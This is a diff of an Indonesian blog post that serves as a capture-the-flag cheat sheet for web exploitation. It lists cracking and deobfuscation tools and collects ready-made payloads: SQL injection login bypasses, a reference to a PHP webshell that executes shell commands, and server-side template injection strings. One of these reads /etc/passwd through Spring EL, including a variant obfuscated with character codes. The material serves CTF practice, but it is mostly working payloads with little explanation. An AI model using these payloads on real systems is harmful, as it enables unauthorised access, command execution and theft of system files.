@@ -3,23 +3,19 @@ title: Semua Tentang CTF - Kategori Web Exploitation
 published: true
 tags: ctf
 ---
+
+Halo teman-teman jadi aku bakal ngebagiin tools, kode, dan payload yang bermanfaat untuk lomba CTF. Halaman ini akan update terus karena ada penambahan payload dan tools yang baru.
+
 # Tools dan File yang Umum Digunakan
 Kategori Web Exploitation:
 1. [JWT (JSON Web Token) - Cookie dengan JAuth](https://token.dev/){:target="_blank"}
 2. [Deobfuscate - Kode JS yang Sulit Dibaca](https://deobfuscate.io/){:target="_blank"}
 3. [John The Ripper - Brutefore JWT Signature Key](https://github.com/openwall/john-packages){:target="_blank"}
 4. [Rockyou Wordlist - Kumpulan Kata untuk Bruteforce CTF](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt){:target="_blank"}
+5. wasm-decompile - Tools untuk decompile kode binary Web Assembly: Bisa install di Kali Linux `sudo apt install wabt`.
 
 # Kode Penting
-SQL Injection
-```sql
-' OR 1=1--
-```
 
-Modified SQL Injection (by me)
-```sql
-' OR 1=1 OR '1'='1
-```
 PHP Webshell (Execute Linux Command) dari [joswr1ght](https://gist.github.com/joswr1ght).
 
 ```php
@@ -40,12 +36,22 @@ PHP Webshell (Execute Linux Command) dari [joswr1ght](https://gist.github.com/jo
 </body>
 </html>
 ```
+# All Payloads
+## SQL Injection
+```sql
+' OR 1=1--
+```
 
-# Catatan Tambahan Untuk Belajar
+## Modified SQL Injection (by me)
+```sql
+' OR 1=1 OR '1'='1
+```
+
 ## Comment Pada SQL
 ```sql
 SELECT * FROM Customers -- WHERE City='Berlin';
 ```
+
 ```sql
 /*Select all the columns
 of all the records
@@ -55,10 +61,10 @@ SELECT * FROM Customers;
 ```sql
 SELECT CustomerName, /*City,*/ Country FROM Customers;
 ```
-## Username yang Umum Digunakan
-```admin``` paling umum digunakan.
 
 ## SSTI Payloads (Untuk Jinja/Flask)
+
+Kode dari (payloadbox/ssti-payloads)[https://github.com/payloadbox/ssti-payloads]
 
 ```python
 {{2*2}}[[3*3]]
@@ -112,3 +118,6 @@ ${T(java.lang.System).getenv()}
 ${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```
+
+## Username yang Umum Digunakan
+```admin``` paling umum digunakan.
